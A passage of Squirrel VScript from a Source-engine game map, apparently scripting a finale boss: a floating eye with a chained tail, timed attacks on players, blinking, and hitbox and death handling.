				if(movetarget.GetScriptScope().piecelist_done.len()>0)
				{
					mtarget = movetarget.GetScriptScope().piecelist_done[movetarget.GetScriptScope().piecelist_done.len()-1].GetOrigin();
					dtarget = movetarget.GetScriptScope().piecelist_done[movetarget.GetScriptScope().piecelist_done.len()-1].GetForwardVector();
				}
				local dir = self.GetForwardVector();
				dir += (dtarget * 0.03);
				dir.Norm();
				self.SetForwardVector(dir);
				interpolation += movespeed;
				local result_interpolation = ::SmootherStep(interpolation);
				local posdir = mtarget - startpos;
				local posdist = ::GetDistance(mtarget,startpos);
				posdir.Norm();
				self.SetOrigin(startpos+(posdir*(posdist*result_interpolation)));
				if(result_interpolation > 0.95)
				{
					ticking = false;
					movetarget.GetScriptScope().piecelist_done.push(self);
					self.__KeyValueFromString("targetname","block_finale_chaintop");
				}
			}
		},function CollectPieces(){
			local candidates = [];
			for(local h;h=Entities.FindByNameWithin(h,"block_finale_top",Vector(self.GetOrigin().x,self.GetOrigin().y,arena_pos.z),piece_scan_radius);)
			{
				if(h==null||!h.IsValid())continue;
				candidates.push(h);
			}
			if(candidates.len()<=0)return false;
			local processed = false;
			while(!processed)
			{
				processed = true;
				if(candidates.len()<=0 || piecelist.len()>=pieceamount_target)break;
				processed = false;
				local randcand_idx = RandomInt(0,candidates.len()-1);
				local candidate = candidates[randcand_idx];
				candidates.remove(randcand_idx);
				candidate.__KeyValueFromString("targetname","block_finale_top_taken");
				piececollect_buffer.push(candidate);
			}
			return true;
		},function TickAliveCT(){
			if(isdead)return;
			EntFireByHandle(self,"RunScriptCode"," TickAliveCT(); ",3.00,null,null);
			local ctac = 0;
			for(local h;h=Entities.FindByClassname(h,"player");)
			{
				if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
				ctac++;
			}
			if(ctac < ct_alive_count)
			{
				local hpremove = abs((ct_alive_count-ctac)*::finale_boss_hp_ctdeath_reduce);
				if(hitbox==null||!hitbox.IsValid()){}else
				{
					EntFireByHandle(hitbox,"RemoveHealth",hpremove.tostring(),0.00,null,null);
					if(!::finale_checkout_checked)
						printl("[FINALE BOSS] "+(ct_alive_count-ctac).tostring()+" players died this 'TickAliveCT' tick - removing "+hpremove+"hp from boss!");
					else
						printl("[INFINITE FINALE BOSS] "+(ct_alive_count-ctac).tostring()+" players died this 'TickAliveCT' tick - removing "+hpremove+"hp from boss!");
				}
			}
			ct_alive_count = (0+ctac);
		},function TickMovement(){
			if(deadfadeout_count > 500)
			{
				EntFireByHandle(self,"Kill","",0.00,null,null);
				foreach(p in piecelist_done){EntFireByHandle(p,"Kill","",0.00,null,null);}
				return;
			}
			EntFireByHandle(self,"RunScriptCode"," TickMovement(); ",0.01,null,null);
			piece_sin -= 0.05;
			if(piecelist_done.len()>0)
			{
				local chain = [];
				local chain_distance = 90;
				local chain_distance_first = 80;
				chain.push(self);
				foreach(p in piecelist_done){chain.push(p);}
				for(local i=1;i<chain.len();i++)
				{
					if(chain[0]==null||!chain[0].IsValid()||chain[i]==null||!chain[i].IsValid())continue;
					if(i==1)
					{
						chain[i].SetOrigin(chain[i-1].GetOrigin() - (chain[i-1].GetForwardVector()*chain_distance_first));
						continue;
					}
					local newpos = chain[i].GetOrigin();
					local tailsnap_mult = 1.00;
					if(tailaim && tailaim_attackcd<=0.00 && tailsnap_pos == null && RandomFloat(0.00,1000.00)<=::finale_boss_attack_tailsnap_chance)
					{
						if(playertarget==null||!playertarget.IsValid()||playertarget.GetTeam()!=3||playertarget.IsAlive()==false){}else
						{
							EntFireByHandle(self,"RunScriptCode"," tailsnap = true; ",tailsnap_delay,null,null);
							EntFireByHandle(self,"RunScriptCode"," tailsnap = false; ",tailsnap_delay+0.50,null,null);
							EntFireByHandle(self,"RunScriptCode"," tailsnap_pos = null; ",tailsnap_delay+1.50,null,null);
							EntFireByHandle(self,"RunScriptCode"," tailsnap_liftmult = 1.00; ",tailsnap_delay+1.40,null,null);
							local pvel = playertarget.GetVelocity();
							pvel.z = 0.00;
							local pveldir = Vector()+pvel;
							pveldir.Norm();
							pvel = pvel.Length();
							if(pvel > 400)pvel = 400;
							tailsnap_pos = playertarget.GetOrigin()+Vector(0,0,4)+(pveldir*(pvel*(tailsnap_delay * tailsnap_estimate_modifier)));
							tailsnap_pos_buffer = Vector()+tailsnap_pos;	//just a cache for sound, really
							tailsnap_liftmult = 2.00;
								//DebugDrawBox(tailsnap_pos, Vector(-10,-10,0), Vector(10,10,10), 255,0,0,255, tailsnap_delay);
							local rplay = RandomInt(1,4);
							for(local i=0;i<rplay;i++)
								EntFireByHandle(self,"RunScriptCode"," if(!isdead && tailaim && !midspin){ "+
									" ::Sound(\"*luffaren/clang.mp3\",tailsnap_pos_buffer,null,30000,5.00,RandomInt(40,100),10);} ",tailsnap_delay*0.90,null,null);
						}
					}
					else if(i>=(chain.len()-1) && tailaim && tailaim_attackcd<=0.00 && tailsnap_pos==null && !midspin &&
					chain.len()>=::finale_boss_attack_tailshoot_minpieces && RandomFloat(0.00,1000.00)<=::finale_boss_attack_tailshoot_chance)
					{
						if(playertarget==null||!playertarget.IsValid()||playertarget.GetTeam()!=3||playertarget.IsAlive()==false){}else
						{
							local spiece = chain[i];
							spiece.GetScriptScope().Remove(false);
							spiece.GetScriptScope().is_bullet = true;
							local pvel = playertarget.GetVelocity();
							pvel.z = 0.00;
							local pveldir = Vector()+pvel;
							pveldir.Norm();
							pvel = pvel.Length();
							if(pvel > 400)pvel = 400;
							local estpos = playertarget.GetOrigin()+Vector(0,0,32)+(pveldir*(pvel*
								(RandomFloat(tailshoot_estimate_modifier_min,tailshoot_estimate_modifier_max))));
							local tdir = estpos - spiece.GetOrigin();
							tdir.Norm();
							local tang = ::DirToAngles(tdir);
							::Ent(spiece.GetOrigin(),Vector(),"func_movelinear",{
									movedir = ""+tang.x.tostring()+" "+tang.y.tostring()+" "+tang.z.tostring(),
									movedistance = 20000,
									speed = 0+tailshoot_speed,
									blockdamage = 999999,
									spawnflags = 8,
								},{
								spiece = spiece,
								tdir = tdir,
								function PostAng(){
									spiece.SetForwardVector(tdir);
								},
								function Run(){
									EntFireByHandle(spiece,"SetParent","!activator",0.00,self,null);
									EntFireByHandle(self,"Open","",0.02,null,null);
									EntFireByHandle(self,"RunScriptCode"," PostAng(); ",0.03,null,null);
									EntFireByHandle(self,"Kill","",3.00,null,null);
									::Sound("*luffaren/punch.mp3",Vector(),self,20000,2.00,RandomInt(30,40),10);
								}});
						}
					}
					if(tailsnap)
						tailsnap_mult = 20.00;
					newpos += Vector(RandomFloat(-1,1),RandomFloat(-1,1),RandomFloat(-1,1));
					if(!isdead && midspin)
					{
						newpos -= (chain[0].GetForwardVector()*50.00);
						if(midspin_started)
							newpos.z += (chain[0].GetOrigin().z - chain[i].GetOrigin().z);
					}
					else if(!isdead && tailaim && playertarget != null)
					{
						local zidx = chain.len()-i;
						local fidx = 0+(i*tailsnap_mult);
						local reldir = Vector();
						local tdist = 99999;
						if(tailsnap_pos != null)
						{
							reldir = tailsnap_pos - chain[i].GetOrigin();
							tdist = ::GetDistance(tailsnap_pos,chain[i].GetOrigin());
						}
						else
						{
							reldir = playertarget.EyePosition() - chain[i].GetOrigin();
							tdist = ::GetDistance(playertarget.EyePosition(),chain[i].GetOrigin());
						}
						reldir.Norm();
						if(tdist <= fidx)fidx = 0.00+tdist;
						newpos += (reldir * fidx);
						newpos += Vector(0,0,zidx*(tailsnap_liftmult+tailsnap_liftmult2));
					}
					else
					{
						newpos.z += (sin(piece_sin+(i.tofloat()/2))*4);
						newpos -= (chain[0].GetForwardVector()*8.00);
						if(lowdrift)newpos += (chain[0].GetUpVector()*5.00);
						else newpos -= (chain[0].GetUpVector()*1.00);
					}
					chain[i].SetOrigin(newpos);
					if(tailsnap && tailsnap_pos != null && ::GetDistance(tailsnap_pos,newpos) < 5.00)
					{
						EntFireByHandle(self,"RunScriptCode"," tailsnap = false; ",0.05,null,null);
						EntFireByHandle(self,"RunScriptCode"," tailsnap_liftmult = 2.00; ",0.10,null,null);
						EntFireByHandle(self,"RunScriptCode"," tailsnap_liftmult = 1.00; ",0.50,null,null);
					}
					local dist = ::GetDistance(chain[i].GetOrigin(),chain[i-1].GetOrigin());
					local dir = chain[i].GetOrigin() - chain[i-1].GetOrigin();
					dir.Norm();
					if(dist > chain_distance)chain[i].SetOrigin(chain[i-1].GetOrigin() + (dir * chain_distance));
					chain[i].SetForwardVector(dir);
				}
			}
			if(isdead)
			{
				deadvel.z -= 0.30;
				if(deadvel.z < -50)deadvel.z = -50;
				self.SetOrigin(self.GetOrigin()+deadvel);
				local ang = self.GetAngles();
				ang += deadrot;
				self.SetAngles(ang.x,ang.y,ang.z);
				deadfadeout_count++;
				return;
			}
			if(playertarget==null||!playertarget.IsValid()||playertarget.GetTeam()!=3||playertarget.IsAlive()==false)playertarget=null;
			else
			{
				if(tailsnap_pos != null)looktarget = Vector()+tailsnap_pos;
				else looktarget = playertarget.GetOrigin()+Vector(0,0,48);
				if(!sight_cd && eyelid_open && !midspin && humanamount >= ::finale_boss_attack_sight_minct && stunvar <= 0.00)
				{
					::EyeTrace(playertarget,{boss=self,function Run(player,dir,rot){
							local dd_pb = ::DirectionDifference(player.EyePosition(),boss.GetOrigin(),dir);
							local dd_bp = ::DirectionDifference(boss.GetOrigin(),player.EyePosition(),boss.GetForwardVector());
							local total = (0.00+dd_pb+dd_bp);
							if(total <= ::finale_boss_attack_sight_minvalue && RandomFloat(0.00,1000.00)<=::finale_boss_attack_sight_chance)
							{
								boss.GetScriptScope().sight_cd = true;
								EntFireByHandle(boss,"RunScriptCode"," sight_cd = false; ",::finale_boss_attack_sight_cooldown,null,null);
								EntFireByHandle(player,"SetHealth",(player.GetHealth()-(0.00+(::finale_boss_attack_sight_damage*::finale_boss_dmgmult))).tostring(),0.00,null,null);
								local tdir = player.EyePosition() - boss.GetOrigin();
								tdir.Norm();
								local tang = ::DirToAngles(tdir);
								tdir.z = 0.00;
								tdir.Norm();
								tdir = (tdir*::finale_boss_attack_sight_xyvel)+Vector(0,0,::finale_boss_attack_sight_zvel);
								player.SetVelocity(tdir);
								
								
								
								//::Ent(boss.GetOrigin(),tang,"prop_dynamic",{						//__CSS__ og
								::Ent(boss.GetOrigin(),tang + Vector(-90,0,0),"prop_dynamic",{		//__CSS__ because of floorindicator, gotta offset the rotation
										model = "models/luffaren/floor_indicator.mdl",
										rendermode = 3,
										renderamt = 100,
										modelscale = 1.00,
										skin = 1,
										rendercolor = Vector(50,70,150),
											//__CSS__ below was the original setup in csgo (functional glow) - new above^
										//model = boss.GetModelName(),
										//rendermode = 1,
										//renderamt = 10,
										//modelscale = 2.00,
										//glowenabled = 1,
										//glowdist = 10000,
										//glowstyle = 1,
										//glowcolor = Vector(50,70,150),
									},{
									tang = tang,
									function Run(){
										::Ent(self.GetOrigin(),self.GetAngles(),"func_movelinear",{
												movedir = ""+tang.x.tostring()+" "+tang.y.tostring()+" "+tang.z.tostring(),
												movedistance = 20000,
												speed = 5000,
												blockdamage = 999999,
												spawnflags = 8,
											},{
											model = self,
											function Run(){
												EntFireByHandle(model,"SetParent","!activator",0.00,self,null);
												EntFireByHandle(self,"Open","",0.02,null,null);
												EntFireByHandle(self,"Kill","",0.30,null,null);
											}});
									}});
							}
							//ScriptPrintMessageCenterAll("player to boss: "+dd_pb.tostring()+"\nboss to player: "+dd_bp.tostring()+"\nresult value: "+total.tostring());
						}});
				}
			}
			if(stunvar > 0.00)
			{
				tailaim = false;
				lowdrift = false;
				midspin = false;
				eyelid_open = true;
				fling = 0.00;
				flingshake = 0.00;
				stunvar -= 0.01;
				should_move = true;
				tailaim_attackcd = 0.00+tailaim_attackcd_set;
				tailaim_forcecd = 0.00+tailaim_forcecd_set+(RandomFloat(-tailaim_forcecd_set_randofs,tailaim_forcecd_set_randofs));
				if(stunvar_just_stunned)
				{
					stunvar_just_stunned = false;
					EntFireByHandle(self,"SetAnimation","idle_open_frenzy",0.00,null,null);
					EntFireByHandle(self,"SetDefaultAnimation","idle_open_frenzy",0.01,null,null);
					EntFireByHandle(self,"RunScriptCode"," self.__KeyValueFromFloat(\"playbackrate\",RandomFloat(3.00,6.00)); ",0.03,null,null);
					::Sound("*luffaren/eye_terror.mp3",Vector(),self,100000,1.00,RandomInt(40,60),10);
					::Sound("*luffaren/eye_terror.mp3",Vector(),self,100000,1.00,RandomInt(130,150),10);
				}
				if(stunvar <= 0.00)
				{
					stunvar_just_stunned = true;
					EntFireByHandle(self,"SetAnimation","idle_open",0.02,null,null);
					EntFireByHandle(self,"SetDefaultAnimation","idle_open",0.03,null,null);
				}
			}
			if(tailaim_forcecd > 0.00)tailaim_forcecd -= 0.01;
			if(tailaim_attackcd > 0.00)tailaim_attackcd -= 0.01;
			if(playertarget_cd > 0.00)playertarget_cd -= 0.01;
			else playertarget = null;
			if(playertarget==null||!playertarget.IsValid()||playertarget.GetTeam()!=3||playertarget.IsAlive()==false)
			{
				local players = [];
				humanamount = 0;
				for(local h;h=Entities.FindByClassname(h,"player");){if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;players.push(h);humanamount++}
				if(players.len()>0)playertarget = players[RandomInt(0,players.len()-1)];
				if(playertarget==null||!playertarget.IsValid()||playertarget.GetTeam()!=3||playertarget.IsAlive()==false)playertarget_cd = 0.50;
				else playertarget_cd = 0.00+playertarget_cd_set;
			}
			local look_speed = 0.02;
			if(midspin)
			{
				if(midspin_started)target_pos = arena_pos + Vector(0,0,20);
				else target_pos = arena_pos + Vector(0,0,500);
				if(self.GetForwardVector().z != 0.00)
				{
					local sfw = self.GetForwardVector();
					sfw.z = 0.00;
					self.SetForwardVector(sfw);
				}
				local fa = self.GetAngles();
				fa.x = 0.00;
				fa.y += 90;
				fa.z = 0.00;
				local fv = ::AnglesToDir(fa);
				fv.z = 0.00;
				looktarget = self.GetOrigin()+(fv*1000);
				look_speed = 0.05;
			}
			else if(fling > 0.00)
			{
				fling -= 0.01;
				flingshake += 0.015;
				local flingpitch = 80.00-(fling*30);
				if(flingpitch < 30.00)flingpitch = 30.00;
				flingpitch = flingpitch.tointeger();
				if((flingpitch % 5) == 0)::Sound("*luffaren/rift_teleport.mp3",Vector(),self,50000,0.10,flingpitch+RandomInt(-5,5),10);
				if(fling <= 0.00)
				{
					fling = 0.00;
					flingshake = 0.00;
					should_move = true;
					for(local h;h=Entities.FindByClassnameWithin(h,"player",self.GetOrigin(),::finale_boss_attack_fling_distance);)
					{
						if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
						::EyeTrace(h,{boss=self,function Run(player,dir,rot){
								local total = ::DirectionDifference(player.EyePosition(),boss.GetOrigin(),dir);
								if(total <= ::finale_boss_attack_fling_min_lookangle)
								{
									local pdir = player.GetOrigin() - boss.GetOrigin();
									local tang = ::DirToAngles(pdir);
									pdir.z = 0.00;
									pdir.Norm();
									player.SetVelocity((pdir*::finale_boss_attack_fling_xyvel)+Vector(0,0,::finale_boss_attack_fling_zvel));
									if(::finale_boss_attack_fling_damage==null||::finale_boss_attack_fling_damage<=0.00){}
									else EntFireByHandle(player,"SetHealth",(player.GetHealth()-((0.00+::finale_boss_attack_fling_damage)*::finale_boss_dmgmult)).tostring(),0.00,null,null);
									
									
									
									//::Ent(boss.GetOrigin(),tang,"prop_dynamic",{						//__CSS__ og
									::Ent(boss.GetOrigin(),tang + Vector(-90,0,0),"prop_dynamic",{		//__CSS__ because of floorindicator, gotta offset the rotation
											
											model = "models/luffaren/floor_indicator.mdl",
											rendermode = 3,
											renderamt = 100,
											modelscale = 1.00,
											skin = 1,
											rendercolor = Vector(255,220,0),
												//__CSS__ below was the original setup in csgo (functional glow) - new above^
											//model = boss.GetModelName(),
											//rendermode = 1,
											//renderamt = 10,
											//modelscale = 2.00,
											//glowenabled = 1,
											//glowdist = 10000,
											//glowstyle = 1,
											//glowcolor = Vector(255,220,0),
										},{
										tang = tang,
										function Run(){
											::Ent(self.GetOrigin(),self.GetAngles(),"func_movelinear",{
													movedir = ""+tang.x.tostring()+" "+tang.y.tostring()+" "+tang.z.tostring(),
													movedistance = 20000,
													speed = 10000,
													blockdamage = 999999,
													spawnflags = 8,
												},{
												model = self,
												function Run(){
													EntFireByHandle(model,"SetParent","!activator",0.00,self,null);
													EntFireByHandle(self,"Open","",0.02,null,null);
													EntFireByHandle(self,"Kill","",0.20,null,null);
												}});
										}});
								}
							}});
					}
					for(local i=0;i<3;i++)
					{
						::Sound("*luffaren/stuka_boom.mp3",Vector(),self,100000,2.00,RandomInt(200,255),10);
						::Sound("*luffaren/stuka_boomx.mp3",Vector(),self,100000,2.00,RandomInt(200,255),10);
					}
				}
				local rpos = self.GetOrigin()+Vector(RandomInt(-1000,1000),RandomInt(-1000,1000),RandomInt(0,300));
				local tang = self.GetOrigin() - rpos;
				tang.Norm();
				tang = ::DirToAngles(tang);
				
				
				
				
				//::Ent(rpos,tang,"prop_dynamic",{						//__CSS__ og
				::Ent(rpos,tang + Vector(-90,0,0),"prop_dynamic",{		//__CSS__ because of floorindicator, gotta offset the rotation
						model = "models/luffaren/floor_indicator.mdl",
						rendermode = 3,
						renderamt = 100,
						modelscale = 0.70,
						skin = 1,
						rendercolor = Vector(150,120,20),
								//__CSS__ below was the original setup in csgo (functional glow) - new above^
						//model = self.GetModelName(),
						//rendermode = 1,
						//renderamt = 10,
						//modelscale = 1.00,
						//glowenabled = 1,
						//glowdist = 10000,
						//glowstyle = 1,
						//glowcolor = Vector(150,120,20),
					},{
					tang = tang,
					function Run(){
						::Ent(self.GetOrigin(),self.GetAngles(),"func_movelinear",{
								movedir = ""+tang.x.tostring()+" "+tang.y.tostring()+" "+tang.z.tostring(),
								movedistance = 20000,
								speed = 2000,
								blockdamage = 999999,
								spawnflags = 8,
							},{
							model = self,
							function Run(){
								EntFireByHandle(model,"SetParent","!activator",0.00,self,null);
								EntFireByHandle(self,"Open","",0.02,null,null);
								EntFireByHandle(self,"Kill","",0.30,null,null);
							}});
					}});
				
				
				
				
			}
			target_dir = looktarget - self.GetOrigin();
			target_dir.Norm();
			local dir = self.GetForwardVector();
			dir += (target_dir * look_speed);
			dir.Norm();
			self.SetForwardVector(dir);
			if(!should_move)
			{
				if(flingshake > 0.00)
					self.SetOrigin(self.GetOrigin()+Vector(RandomFloat(-flingshake,flingshake),RandomFloat(-flingshake,flingshake),RandomFloat(-flingshake,flingshake)));
				return;
			}
			if(stunvar > 0.00)return;
			local reached_end = false;
			if(interpolate_movement && interpolation >= 0.95)reached_end = true;
			else if(!interpolate_movement && ::GetDistance(self.GetOrigin(),target_pos) <= 100)reached_end = true;
			if(midspin)reached_end = false;
			if(!should_move)reached_end = false;
			if(reached_end)
			{
				interpolation = 0.00;
				interpolation_startpos = self.GetOrigin();
				interpolation_speed = RandomFloat(0.003,0.010);
				if(RandomInt(1,2)==1)interpolate_movement = true;
				else interpolate_movement = false;
				if(!::finale_started)
				{
					if(playertarget==null||!playertarget.IsValid()||playertarget.GetTeam()!=3||playertarget.IsAlive()==false){}
					else arena_pos = playertarget.GetOrigin();
				}
				if(RandomFloat(0.00,100.00)<=::finale_boss_tailaim_toggle_chance || !tailaim && !midspin && tailaim_forcecd <= 0.00)
				{
					tailaim = !tailaim;
					if(tailaim)tailaim_attackcd = 0.00+tailaim_attackcd_set;
					tailaim_forcecd = 0.00+tailaim_forcecd_set+(RandomFloat(-tailaim_forcecd_set_randofs,tailaim_forcecd_set_randofs));
				}
				if(RandomFloat(0.00,100.00)<=::finale_boss_playsound_chance && !isdead)
				{
					local rplay = RandomInt(1,3);
					for(local i=0;i<rplay;i++)
						EntFireByHandle(self,"RunScriptCode",
							" ::Sound(\"*luffaren/eye_terror"+RandomInt(2,5).tostring()+".mp3\",Vector(),self,50000,5.00,RandomInt(40,120),10); ",
								0.00,null,null);
				}
				if(RandomFloat(0.00,100.00)<=::finale_boss_lowdrift_toggle_chance)lowdrift = !lowdrift;
				if(lowdrift)tailsnap_liftmult2 = 1.00;
				else tailsnap_liftmult2 = 0.00;
				if(fling <= 0.00 && piecelist.len() >= ::finale_boss_attack_spin_minpieces && RandomFloat(0.00,100.00)<=::finale_boss_attack_spin_chance)
				{
					midspin = true;
					tailaim = false;
					tailaim_forcecd = 0.00+tailaim_forcecd_set+(RandomFloat(-tailaim_forcecd_set_randofs,tailaim_forcecd_set_randofs));
					EntFireByHandle(self,"RunScriptCode"," midspin_started = true; ",::finale_boss_attack_spin_startup_delay,null,null);
					EntFireByHandle(self,"RunScriptCode"," midspin_started = false; ",::finale_boss_attack_spin_length,null,null);
					EntFireByHandle(self,"RunScriptCode"," tailaim = false; ",::finale_boss_attack_spin_length+0.49,null,null);
					EntFireByHandle(self,"RunScriptCode"," tailaim_forcecd = 0.00+tailaim_forcecd_set+(RandomFloat(-tailaim_forcecd_set_randofs,tailaim_forcecd_set_randofs)); ",::finale_boss_attack_spin_length+0.49,null,null);
					EntFireByHandle(self,"RunScriptCode"," midspin = false; ",::finale_boss_attack_spin_length+0.50,null,null);
					target_pos = arena_pos + Vector(0,0,20);
					interpolate_movement = false;
					should_move = true;
					local rplay = RandomInt(2,4);
					for(local i=0;i<rplay;i++)
						EntFireByHandle(self,"RunScriptCode",
							" ::Sound(\"*luffaren/eye_terror"+RandomInt(2,5).tostring()+".mp3\",Vector(),self,50000,5.00,RandomInt(20,200),10); ",
								0.00,null,null);
					EntFireByHandle(self,"RunScriptCode"," ::Sound(\"*luffaren/stuka.mp3\",Vector(),self,50000,5.00,RandomInt(230,255),10); ",0.00,null,null);
				}
				else
				{
					midspin = false;
					midspin_started = false;
					if(lowdrift)target_pos = arena_pos+Vector(0,0,RandomFloat(80,80))+(::AnglesToDir(Vector(0,RandomFloat(0,360),0))*(RandomFloat(0,arena_radius+500)));
					else target_pos = arena_pos+Vector(0,0,RandomFloat(100,700))+(::AnglesToDir(Vector(0,RandomFloat(0,360),0))*(RandomFloat(0,arena_radius+500)));
				}
				if(midspin)should_move = true;
				else if(first_movement>2)
				{
					if(fling <= 0.00 && RandomFloat(0.00,100.00)<=::finale_boss_attack_fling_chance)
					{
						fling = (0.00+::finale_boss_attack_fling_chargetime);
						should_move = false;
					}
				}
				if(piecelist.len()<pieceamount_target)CollectPieces();
				if(first_movement < 2)
				{
					interpolate_movement = true;
					midspin = false;
					lowdrift = false;
					tailaim = false;
					first_movement++;
					fling = 0.00;
					if(first_movement == 2)
					{
						first_movement++;
						should_move = false;
						EntFireByHandle(self,"RunScriptCode"," should_move = true; ",6.00,null,null);
					}
					else target_pos = arena_pos+Vector(0,0,RandomFloat(800,800))+(::AnglesToDir(Vector(0,RandomFloat(0,360),0))*(RandomFloat(0,1)));
				}
			}
			if(!interpolate_movement)
			{
				local pos = self.GetOrigin();
				local posdist = ::GetDistance(self.GetOrigin(),target_pos);
				local posdir = target_pos - self.GetOrigin();
				posdir.Norm();
				if(midspin)
				{
					if(midspin_started)pos += (posdir * (posdist/30));
					else pos += (posdir * (posdist/20));
				}
				else pos += (posdir * (posdist/100));
				self.SetOrigin(pos);
			}
			else
			{
				interpolation += interpolation_speed;
				local result_interpolation = ::SmootherStep(interpolation);
				local posdir = target_pos - self.GetOrigin();
				local posdist = ::GetDistance(self.GetOrigin(),target_pos);
				posdir.Norm();
				self.SetOrigin(interpolation_startpos+(posdir*(posdist*result_interpolation)));
			}
		},function TickBlink(){
			if(isdead || stunvar > 0.00)return;
			if(eyelid_open){
				EntFireByHandle(self,"SetAnimation","close",0.00,null,null);
				EntFireByHandle(self,"SetDefaultAnimation","idle_closed",0.01,null,null);
				EntFireByHandle(self,"RunScriptCode"," TickBlink(); ",RandomFloat(0.20,1.50),null,null);}
			else{
				EntFireByHandle(self,"SetAnimation","open",0.00,null,null);
				EntFireByHandle(self,"SetDefaultAnimation","idle_open",0.01,null,null);
				EntFireByHandle(self,"RunScriptCode"," TickBlink(); ",RandomFloat(0.20,5.00),null,null);}
			::Sound("*luffaren/eyelid_flesh.mp3",Vector(),self,10000,1.00,RandomInt(30,90),10);
			EntFireByHandle(self,"RunScriptCode"," self.__KeyValueFromFloat(\"playbackrate\",RandomFloat(2.00,10.00)); ",0.03,null,null);
			eyelid_open = !eyelid_open;
		},function Start(){
			EntFireByHandle(self,"SetAnimation","open",1.00,null,null);
			EntFireByHandle(self,"SetDefaultAnimation","idle_open",1.01,null,null);
			EntFireByHandle(self,"RunScriptCode"," ::Sound(\"*luffaren/eyelid_flesh.mp3\",Vector(),self,10000,1.00,RandomInt(20,40),10); ",1.00,null,null);
			for(local i=0;i<1;i++)
				EntFireByHandle(self,"RunScriptCode"," ::Sound(\"*luffaren/eye_terror.mp3\",Vector(),self,50000,5.00,RandomInt(65,75),10); ",0.00,null,null);
			EntFireByHandle(self,"RunScriptCode"," TickBlink(); ",RandomFloat(2.50,8.00),null,null);
			target_pos = self.GetOrigin();
			EntFireByHandle(self,"RunScriptCode"," TickMovement(); ",1.00,null,null);
			EntFireByHandle(self,"RunScriptCode"," CollectPiecesTick(); ",1.00,null,null);
			local bosshp = 0+::finale_boss_hp_base;
			EntFireByHandle(self,"RunScriptCode"," TickAliveCT(); ",3.00,null,null);
			ct_alive_count = 0;
			for(local h;h=Entities.FindByClassname(h,"player");)
			{
				if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
				bosshp += ::finale_boss_hp_each;
				ct_alive_count++;
			}
			local bosshp_stagestack = (0+(::maps.len()*::finale_boss_hp_stage_each));
			if(bosshp_stagestack > ::finale_boss_hp_stage_cap)bosshp_stagestack = (0+::finale_boss_hp_stage_cap);
			bosshp += bosshp_stagestack;
			bosshp /= ::finale_boss_spawnamount;
			::finale_boss_statp_maxhp += (0+bosshp);
			::Hitbox(self.GetOrigin(),self.GetAngles(),bosshp,Vector(-80,-120,-80),Vector(50,120,100),"",false,{
				master = self,
				fxcooldown = false,
				maxhp = 0.00+bosshp,
				function Act(index,attackerhandle){
						//printl("index(1:init|2:damaged|3:broken):"+index+" | "+hitboxhandle+" | "+attackerhandle);
					if(index==1)//initialize
					{
						EntFireByHandle(hitboxhandle,"SetParent","!activator",0.00,master,null);
						EntFireByHandle(hitboxhandle,"AddOutput","targetname boss_eye_hitbox",0.00,null,null);
						master.GetScriptScope().hitbox = hitboxhandle;
					}
					else if(index==2)//damaged
					{
						if(!fxcooldown)
						{
							fxcooldown = true;
							EntFireByHandle(hitboxhandle,"RunScriptCode"," logic.fxcooldown = false; ",0.06,null,null);
							EntFireByHandle(master,"AddOutput","rendercolor 255 130 130",0.00,null,null);
							EntFireByHandle(master,"AddOutput","rendercolor 255 255 255",0.03,null,null);
							local hp_perc = ((fabs(((hitboxhandle.GetHealth()-::HITBOX_ZERO_HP)-maxhp)/maxhp))*10);
							hp_perc -= 2.5;
							hp_perc = hp_perc.tointeger();
							if(hp_perc < 0)hp_perc = 0;
							else if(hp_perc > 6)hp_perc = 6;
							EntFireByHandle(master,"AddOutput","skin "+hp_perc.tostring(),0.00,null,null);
						}
					}
					else if(index==3)//broken
					{
						local rand_deadvel = true;
						if(::finale_started && ::finale_bosscount>=0)
						{
							::finale_bosscount--;
							if(::finale_bosscount<=0)
							{
								::finale_bosscount = -9999;
								EntFireByHandle(master,"RunScriptCode",
									" ::finale_cleanerpos=Vector(self.GetOrigin().x,self.GetOrigin().y,arena_pos.z); ",2.10,null,null);
								::finale_post_impostor=true;
								EntFire("manager","RunScriptCode"," StartFinaleEscape(); ",2.12,null);
								rand_deadvel = false;
								local apdir = master.GetScriptScope().arena_pos - master.GetOrigin();
								apdir.z = 0.00;
								apdir.Norm();
								master.GetScriptScope().deadvel = (apdir*(RandomFloat(0.00,10.00)))+Vector(0,0,RandomFloat(24,26));
									//EntFire("manager","RunScriptCode"," hornsound_enabled = false; ",30.00,null);
								::SendCustomEvent("finale_bossfight_ended",{});
									//NEW IN v1_9 - run a slightly-delayed check on falling CT's to set their up-velocity, prevent deaths from falling too early #jjrtwerfrw
								local pqsave = [{qrate=3.00,function Run(){}},{qrate=3.00,function Run(){
										for(local h;h=Entities.FindByClassname(h,"player");)
											{if(h==null||!h.IsValid()||h.IsAlive()==false||h.GetTeam()!=3||h.GetVelocity().z > -300)continue;
											h.SetVelocity(Vector(0,0,200));}
									}}{qrate=1.00,function Run(){
										for(local h;h=Entities.FindByClassname(h,"player");)
											{if(h==null||!h.IsValid()||h.IsAlive()==false||h.GetTeam()!=3||h.GetVelocity().z > -300)continue;
											h.SetVelocity(Vector(0,0,200));}
									}}];::Process(pqsave,0.05);
							}
						}
						EntFireByHandle(master,"SetAnimation","idle_open_frenzy",0.04,null,null);
						EntFireByHandle(master,"SetDefaultAnimation","idle_open_frenzy",0.05,null,null);
						EntFireByHandle(master,"RunScriptCode"," self.__KeyValueFromFloat(\"playbackrate\",RandomFloat(7.00,10.00)); ",0.03,null,null);
						::Sound("*luffaren/eye_terror.mp3",Vector(),master,150000,1.00,RandomInt(220,255),10);
						::Sound("*luffaren/eye_terror.mp3",Vector(),master,150000,1.00,RandomInt(130,150),10);
						::finale_cleanerpos = Vector(master.GetOrigin().x,master.GetOrigin().y,master.GetScriptScope().arena_pos.z);
						master.GetScriptScope().isdead = true;
						if(rand_deadvel)
							master.GetScriptScope().deadvel = Vector(RandomFloat(-10,10),RandomFloat(-10,10),RandomFloat(20,30));
						master.GetScriptScope().deadrot = Vector(RandomFloat(-5,5),RandomFloat(-5,5),RandomFloat(-5,5));
						::SendCustomEvent("finale_boss_died",{boss=master});
					}
					else if(index==4)//healed
					{
						EntFireByHandle(master,"AddOutput","rendercolor 0 255 50",0.00,null,null);
						EntFireByHandle(master,"AddOutput","rendercolor 0 255 50",0.02,null,null);
